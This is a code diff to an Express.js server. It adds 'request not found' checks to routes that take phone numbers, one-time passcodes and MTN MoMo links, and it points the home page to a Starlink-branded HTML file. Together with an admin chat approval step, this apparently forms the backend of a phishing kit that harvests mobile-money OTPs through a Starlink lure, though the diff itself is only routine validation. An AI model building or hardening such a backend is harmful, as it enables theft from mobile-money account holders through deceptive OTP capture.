@@ -274,6 +274,13 @@ app.post('/api/mtn/submit-otp', (req, res) => {
     return res.status(400).json(jsonError('Missing phone or otp'));
   }
 
+  if (id) {
+    const existing = requests.get(id) || demoMtnRequests.get(id);
+    if (!existing) {
+      return res.status(404).json(jsonError('Request not found'));
+    }
+  }
+
   if (!id) {
     id = createApprovalRequest({
       plan: 'MTN verification',
@@ -355,6 +362,13 @@ app.post('/api/mtn/momo-link', (req, res) => {
     return res.status(400).json(jsonError('Missing phone or link'));
   }
 
+  if (id) {
+    const existing = requests.get(id) || demoMtnRequests.get(id);
+    if (!existing) {
+      return res.status(404).json(jsonError('Request not found'));
+    }
+  }
+
   if (!id) {
     id = createApprovalRequest({
       plan: 'MTN MoMo verification',
@@ -409,6 +423,9 @@ app.post('/api/mtn/submit-link', (req, res) => {
 
   if (requestId) {
     const existing = requests.get(requestId) || demoMtnRequests.get(requestId);
+    if (!existing) {
+      return res.status(404).json(jsonError('Request not found'));
+    }
     if (existing) {
       existing.link = fullLinkValue;
       existing.phone = resolvedPhone;
@@ -582,7 +599,7 @@ if (api && ADMIN_CHAT_ID) {
 // Page routes
 // ---------------------------------------------------------------------------
 app.get('/', (req, res) => {
-  res.sendFile(path.join(PUBLIC_DIR, 'index.html'));
+  res.sendFile(path.join(PUBLIC_DIR, 'starlink-index.html'));
 });
 
 const pages = {
